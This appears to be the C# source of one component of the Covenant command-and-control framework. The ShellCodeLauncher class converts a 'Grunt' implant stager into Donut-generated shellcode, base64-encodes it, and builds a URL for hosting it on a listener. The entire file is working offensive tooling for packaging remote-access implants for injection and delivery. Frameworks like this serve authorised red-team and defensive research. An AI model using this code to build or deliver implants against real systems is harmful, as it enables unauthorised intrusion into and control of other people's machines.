// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using Microsoft.CodeAnalysis;

using Donut;
using Donut.Structs;

using Covenant.Core;
using Covenant.Models.Listeners;
using Covenant.Models.Grunts;

namespace Covenant.Models.Launchers
{
    public class ShellCodeLauncher : Launcher
    {
        public ShellCodeLauncher()
        {
            this.Type = LauncherType.ShellCode;
            this.Description = "Converts a Grunt to ShellCode using Donut.";
            this.Name = "ShellCode";
            this.OutputKind = OutputKind.ConsoleApplication;
            this.CompressStager = false;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            string inputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".exe");
            string outputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".bin");

            try
            {
                File.WriteAllBytes(inputf, StagerAssembly);
                DonutConfig config = new DonutConfig
                {
                    Arch = 3,
                    Bypass = 3,
                    InputFile = inputf,
                    Class = "GruntStager",
                    Method = "Execute",
                    Args = "",
                    Payload = outputf
                };
                int ret = Generator.Donut_Create(ref config);
                if (ret == Constants.DONUT_ERROR_SUCCESS)
                {
                    this.Base64ILByteString = Convert.ToBase64String(File.ReadAllBytes(outputf));
                    this.LauncherString = template.Name + ".bin";
                }
                else
                {
                    string errorMessage = ret switch
                    {
                        Constants.DONUT_ERROR_FILE_NOT_FOUND => "Input file not found",
                        Constants.DONUT_ERROR_FILE_EMPTY => "Input file is empty",
                        Constants.DONUT_ERROR_FILE_ACCESS => "Cannot access input file",
                        Constants.DONUT_ERROR_FILE_INVALID => "Invalid input file format",
                        Constants.DONUT_ERROR_NET_PARAMS => "Invalid .NET parameters",
                        Constants.DONUT_ERROR_NO_MEMORY => "Out of memory",
                        Constants.DONUT_ERROR_INVALID_ARCH => "Invalid architecture specified",
                        Constants.DONUT_ERROR_INVALID_URL => "Invalid URL",
                        Constants.DONUT_ERROR_URL_LENGTH => "URL length exceeds limit",
                        Constants.DONUT_ERROR_INVALID_PARAMETER => "Invalid parameter",
                        Constants.DONUT_ERROR_RANDOM => "Random generation error",
                        Constants.DONUT_ERROR_DLL_FUNCTION => "DLL function not found",
                        Constants.DONUT_ERROR_ARCH_MISMATCH => "Architecture mismatch",
                        Constants.DONUT_ERROR_DLL_PARAM => "DLL parameter error",
                        Constants.DONUT_ERROR_BYPASS_INVALID => "Invalid bypass option",
                        Constants.DONUT_ERROR_NORELOC => "No relocation information",
                        _ => $"Donut shellcode generation error (code: {ret})"
                    };
                    throw new Exception($"ShellCode generation failed: {errorMessage}");
                }
            }
            finally
            {
                // Clean up temporary files
                try
                {
                    if (File.Exists(inputf)) File.Delete(inputf);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"Warning: Failed to delete temporary input file '{inputf}': {ex.Message}");
                }
                try
                {
                    if (File.Exists(outputf)) File.Delete(outputf);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"Warning: Failed to delete temporary output file '{outputf}': {ex.Message}");
                }
            }
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                this.LauncherString = hostedFile.Path.Split("\\").Last().Split("/").Last();
                return hostedLocation.ToString();
            }
            else { return ""; }
        }
    }
}
